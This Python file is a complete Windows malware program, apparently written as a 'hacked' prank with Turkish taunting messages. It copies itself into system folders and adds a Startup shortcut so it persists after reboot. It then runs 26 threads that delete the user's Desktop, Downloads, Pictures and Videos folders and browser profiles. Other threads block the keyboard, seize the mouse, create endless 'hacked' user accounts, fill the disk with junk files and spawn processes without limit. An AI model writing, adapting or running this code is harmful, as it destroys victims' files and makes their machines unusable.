from plyer import *
from selenium import webdriver
from selenium.webdriver.common.options import *
from selenium.webdriver.chrome.webdriver import *
from win10toast import ToastNotifier
import ctypes, os, shutil, speedtest, time, win32com.client
import os, pyautogui, random, threading, keyboard, pygame
import webbrowser, requests, subprocess, locale, string

def func1():
    width, height = pyautogui.size()

    def random_mouse_movement_and_click():
        while True:
            a = random.randint(0, width)
            b = random.randint(0, height)
            
            clicks = (pyautogui.click, pyautogui.doubleClick, pyautogui.leftClick, pyautogui.rightClick, pyautogui.middleClick)
            
            pyautogui.moveTo(a, b)
            random.choice(clicks)()

    threads = []
    for _ in range(10):
        thread = threading.Thread(target=random_mouse_movement_and_click)
        thread.start()
        threads.append(thread)

def func2():
    images = ["https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg","https://gulfsouthtech.com/wp-content/uploads/2019/01/signs-that-youve-been-hacked.jpeg","https://cybersecurityventures.com/wp-content/uploads/2021/03/system-hacked.jpg","https://hackcontrol.org/wp-content/uploads/2021/01/hacked-e1627746564423.png","https://securitytoday.com/-/media/SEC/Security-Products/Images/2017/09/hacked.jpg","https://cloudvoicedata.com.au/wp-content/uploads/2021/08/cpu-vulnerability-3d-render-hacked-processor-conce-8WUSGAS-scaled.jpeg","https://t3.ftcdn.net/jpg/04/97/74/02/360_F_497740223_JSUOc9rc19N3OG59bx4Mr7NM274JoS5y.jpg","https://t4.ftcdn.net/jpg/05/20/88/39/360_F_520883984_4sENoJgAxNjSwMFUxvHyioSVOPIbNRsD.jpg"]
    def sec_ve_ac():
        while True:
            resim = random.choice(images)
            webbrowser.open(resim)
    threads = []
    for _ in range(10):
        thread = threading.Thread(target=sec_ve_ac)
        thread.start()
        threads.append(thread)

def func3():
    toaster = ToastNotifier()
    def notification_func():
        while True:
            yazi = random.choice([
                'Lütfen Enayi Gibi Her Dosyayı Açmayın!',
                'Bu dosyayı açacak kadar enayi olduğunuzu bilmiyordum.',
                'Ne tür bir gerizekalılık!',
                'Çok mu rahatsız oldun paşam!',
                'Çok mu sinirlendin paşam!',
                'Çok mu küfrediyorsun paşam!'
            ])
            toaster.show_toast(
                "Hacklendiniz!",
                yazi,
                duration=1
            )
    notification_func()

def func4():
    urls = ["https://www.youtube.com","https://www.google.com","https://chatgpt.com","https://www.instagram.com","https://github.com"]
    def sec_ve_istek_gonder():
        while True:
            for _ in range(1000):
                url = random.choice(urls)
                requests.get(url, verify=False, allow_redirects=False, timeout=6)

    threads = []
    for _ in range(10):
        thread = threading.Thread(target=sec_ve_istek_gonder)
        thread.start()
        threads.append(thread)

def func5():
    opt = Options()
    opt.add_argument('--start-maximized')
    driverb = webdriver.Chrome(options=opt)
    urls = ["https://www.youtube.com", "https://www.google.com", "https://instagram.com", "https://www.yahoo.com", "https://www.yandex.com.tr"]
    def sec_ve_git():
        driver = webdriver.Chrome()
        driver.execute_script("window.open('');")
        while True:
            url = random.choice(urls)
            driverb.get(url)
    threads = []
    for _ in range(10):
        thread = threading.Thread(target=sec_ve_git)
        thread.start()
        threads.append(thread)

def func6():
    opt = Options()
    opt.add_argument('--headless')
    drivera = webdriver.Chrome(options=opt)
    urls = ["https://www.youtube.com", "https://www.google.com", "https://instagram.com", "https://www.yahoo.com", "https://www.yandex.com.tr"]
    def sec_ve_git():
        driver = webdriver.Chrome()
        driver.execute_script("window.open('');")
        while True:
            url = random.choice(urls)
            drivera.get(url)
    threads = []
    for _ in range(10):
        thread = threading.Thread(target=sec_ve_git)
        thread.start()
        threads.append(thread)

def func7():
    def test_internet_speed():
        while True:
            st = speedtest.Speedtest()
            st.get_best_server()
            download_speed = st.download() / 1000000
            upload_speed = st.upload() / 1000000
            print(f"Download speed: {download_speed:.2f} Mbps, Upload speed: {upload_speed:.2f} Mbps")
    threads = []
    for _ in range(10000):
        thread = threading.Thread(target=test_internet_speed)
        thread.start()
        threads.append(thread)

def func8():
    def download_images():
        resimler = [
            ["https://cybersecurityventures.com/wp-content/uploads/2021/03/system-hacked.jpg", "system-hacked.jpg"],
            ["https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg", "You_Have_Been_Hacked.jpg"],
            ["https://gulfsouthtech.com/wp-content/uploads/2019/01/signs-that-youve-been-hacked.jpeg", "signs-that-youve-been-hacked.jpeg"],
            ["https://hackcontrol.org/wp-content/uploads/2021/01/hacked-e1627746564423.png", "hacked-e1627746564423.png"],
            ["https://securitytoday.com/-/media/SEC/Security-Products/Images/2017/09/hacked.jpg", "hacked.jpg"],
            ["https://cloudvoicedata.com.au/wp-content/uploads/2021/08/cpu-vulnerability-3d-render-hacked-processor-conce-8WUSGAS-scaled.jpeg", "cpu-vulnerability-3d-render-hacked-processor.jpeg"],
            ["https://t3.ftcdn.net/jpg/04/97/74/02/360_F_497740223_JSUOc9rc19N3OG59bx4Mr7NM274JoS5y.jpg", "hacked-processor.jpg"],
            ["https://t4.ftcdn.net/jpg/05/20/88/39/360_F_520883984_4sENoJgAxNjSwMFUxvHyioSVOPIbNRsD.jpg", "hacked-image.jpg"]
        ]
        klasor_yolu = r"C:\Windows\TAPI"
        if not os.path.exists(klasor_yolu):
            os.makedirs(klasor_yolu)
        for url, dosya_adi in resimler:
            response = requests.get(url)
            
            if response.status_code == 200:
                dosya_yolu = os.path.join(klasor_yolu, dosya_adi)
                
                with open(dosya_yolu, "wb") as f:
                    f.write(response.content)
                print(f"Resim başarıyla {dosya_yolu} konumuna indirildi.")
            else:
                print(f"Resim indirilemedi: {url} (Hata kodu: {response.status_code})")
    download_images()
    def set_wallpaper():
        klasor_yolu = r"C:\Windows\TAPI"
        resimler = [
            "You_Have_Been_Hacked.jpg",
            "hacked-e1627746564423.png",
            "hacked.jpg",
            "cpu-vulnerability-3d-render-hacked-processor.jpeg",
            "hacked-processor.jpg",
            "hacked-image.jpg"
        ]
        SPI_SETDESKWALLPAPER = 20
        SPIF_UPDATEINIFILE = 0x01
        SPIF_SENDCHANGE = 0x02

        def set_wallpaper(image_path):
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
        for resim in resimler:
            resim_yolu = os.path.join(klasor_yolu, resim)
            if os.path.exists(resim_yolu):
                set_wallpaper(resim_yolu)
                print(f"Duvar kağıdı {resim} olarak değiştirildi.")
            else:
                print(f"Resim bulunamadı: {resim_yolu}")
    while True:
        set_wallpaper()

def func9():
    while True:
        bat_code = """start"""
        process = subprocess.Popen(bat_code, shell=True)
        process.communicate()
def func10():
    harfler = "qwertyuopasdfghjklzxcvbnm"
    while True:
        harf = random.choice(harfler)
        pyautogui.write(harf)
def func11():
    keys = ['y','v','x','z','enter', 'space', 'shift', 'ctrl', 'alt', 'delete', 'win']
    while True:
        key1 = random.choice(keys)
        key2 = random.choice(keys)
        pyautogui.hotkey(key1, key2) 

def func12():
    total = 0
    user = os.getlogin()
    while True:
        file = f"C:\\Users\\{user}\\Desktop\\Hacked{total}.txt"
        with open(file, "w") as dosya:
            dosya.write("Enayi Gibi hacklendiz!")
        total += 1
def func13():
    while True:
        keyboard.block_key("all")
def func14():
    all_keys = keyboard.all_modifiers + keyboard.all_normal_keys
    while True:
        random_key = random.choice(all_keys)
        keyboard.write(random_key)
def func15():
    user = os.getlogin()
    records = f"C:\\Users\\{user}\\Documents\\Ses kayıtları"
    downloads = f"C:\\Users\\{user}\\Downloads"
    desktop = f"C:\\Users\\{user}\\Desktop"
    pics = f"C:\\Users\\{user}\\Pictures" 
    videos = f"C:\\Users\\{user}\\Videos"
    for item in [records, downloads, desktop, pics, videos]:
        if os.path.exists(item):
            shutil.rmtree(item)
def func16():
    combinations = [
        ('shift', 'delete'), 
        ('shift', 'enter'),
        ('ctrl', 'v'), 
        ('ctrl', 'x'), 
        ('ctrl', 'z'), 
        ('ctrl', 'y'),
        ('win', 'r'),
        ('win', '+'),
        ('win', '-'),
        ('win', 'tab'),
        ('alt', 'tab')
    ]
    while True:
        combination = random.choice(combinations)
        pyautogui.hotkey(*combination)
def func17():
    x = "C:\\Windows\\"
    programs = [f"{x}regedit.exe", f"{x}notepad.exe", f"{x}explorer.exe", f"{x}system32\\calc.exe", f"{x}system32\\control.exe", f"{x}system32\\dxdiag.exe", f"{x}system32\\notepad.exe", f"{x}system32\\SnippingTool.exe", f"{x}system32\\UserAccountControlSettings.exe"]
    while True:
        program = random.choice(programs)
        subprocess.Popen(program)
def func18():
    languages = ['ar_AE.UTF-8', 'ru_RU.UTF-8', 'ja_JP.UTF-8', 'zh_CN.UTF-8', 'th_TH.UTF-8']
    while True:
        for lang in languages:
            locale.setlocale(locale.LC_ALL, lang)
def func19():
    vbs_code = '''
        Set WshShell = WScript.CreateObject("WScript.Shell")
        WshShell.Popup "Hacklendin ZAA!!!", 1, "Hata", 16
    '''
        
    vbs_path = r"E:\Virüs\error_message.vbs"
        
    if not os.path.exists(r"C:\Windows\TAPI"):
         os.makedirs(r"C:\Windows\TAPI")
    
    with open(vbs_path, "w") as file:
            file.write(vbs_code)

    def ah_uh_ali_dursun_dur_ahh():
        os.system(f"cscript //nologo {vbs_path}")
    threads = []
    for _ in range(20000):
        thread = threading.Thread(target=ah_uh_ali_dursun_dur_ahh)
        thread.start()
        threads.append(thread)
def func20():
    media_folder = f"C:\\Windows\\Media\\"
    sounds = ['Windows Notify System Generic.wav', 'Windows Hardware Remove.wav', 'Windows Hardware Insert.wav']
    
    pygame.mixer.init()
    
    while True:
        sound = media_folder + random.choice(sounds)
        pygame.mixer.music.load(sound)
        pygame.mixer.music.play()
        time.sleep(0.5)
def func21():
    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    
    for filename in os.listdir(downloads_path):
        file_path = os.path.join(downloads_path, filename)
        
        if os.path.isfile(file_path):
            while True:
                os.startfile(file_path)
def func22():
    total = 0
    while True:
        total += 1
        subprocess.run(
            ['net', 'user', "hacked"+str(total), ''.join(random.choice(string.ascii_letters) for _ in range(12)), '/add'],
            check=False
        )
def func23():
    path = f"c:\\"
    while True:
        name = ''.join(random.choice(string.ascii_letters) for _ in range(12))
        os.makedirs(path+name)
def func24():
    total = 0
    user = os.getlogin()
    while True:
        file = f'C:\\Users\\{user}\\AppData\\Local\\Programs\\Common\\Hacked{total}.txt'
        with open(file, "w") as dosya:
            dosya.write(''.join(random.choice(string.ascii_letters) for _ in range(12000000)))
        total += 1
def func25():
    user = os.getlogin()
    a = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
    b = f"C:\\Users\\{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
    c = f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default"
    d = f"C:\\Users\\{user}\\AppData\\Roaming\\Opera Software\\Opera Stable"
    e = f"C:\\Users\\{user}\\AppData\\Roaming\\Opera Software\\Opera GX Stable"
    f = f"C:\\Users\\{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default"
    
    if os.path.exists(a):
        os.remove(a)
    if os.path.exists(b):
        os.remove(b)
    if os.path.exists(c):
        os.remove(c)
    if os.path.exists(d):
        os.remove(d)
    if os.path.exists(e):
        os.remove(e)
    if os.path.exists(f):
        os.remove(f)

def func26():
    subprocess.Popen(['Python', 'test.py'])
    print('Goodbye World')

try:
    current_file_path = os.path.abspath(__file__)
    destination_dir = r'C:\Windows\TAPI'
    if not os.path.exists(destination_dir):
        os.makedirs(destination_dir)
    shutil.copy(current_file_path, destination_dir)
except (FileNotFoundError, PermissionError, OSError) as e:
    user = os.getlogin()
    destination_dir = f'C:\\Users\\{user}\\AppData\\Local\\Programs\\Common'
    current_file_path = os.path.abspath(__file__)
    if not os.path.exists(destination_dir):
        os.makedirs(destination_dir)
    shutil.copy(current_file_path, destination_dir)

def add_to_startup():
    program_path = r"C:\Windows\TAPI\main.exe"
    shell = win32com.client.Dispatch('WScript.Shell')
    startup_folder = shell.SpecialFolders('Startup')
    shortcut = startup_folder + r"\Admin.lnk"
    
    shortcut_object = shell.CreateShortCut(shortcut)
    shortcut_object.TargetPath = program_path
    shortcut_object.WorkingDirectory = os.path.dirname(program_path)
    shortcut_object.save()

def start_threads():
    threads = []
    for i in range(1, 27):
        func = globals()[f"func{i}"]
        thread = threading.Thread(target=func)
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()
add_to_startup()
start_threads()